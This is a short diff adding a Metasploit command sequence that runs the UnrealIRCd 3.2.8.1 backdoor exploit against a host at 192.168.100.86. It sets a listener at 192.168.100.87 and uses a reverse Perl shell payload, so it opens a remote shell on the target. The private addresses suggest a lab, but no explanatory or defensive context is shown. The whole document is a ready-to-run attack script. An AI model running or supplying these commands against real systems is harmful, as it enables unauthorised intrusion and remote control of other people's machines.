@@ -1,0 +1,6 @@
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.100.86
+set RPORT 6697
+set LHOST 192.168.100.87
+set PAYLOAD payload/cmd/unix/reverse_perl
+exploit
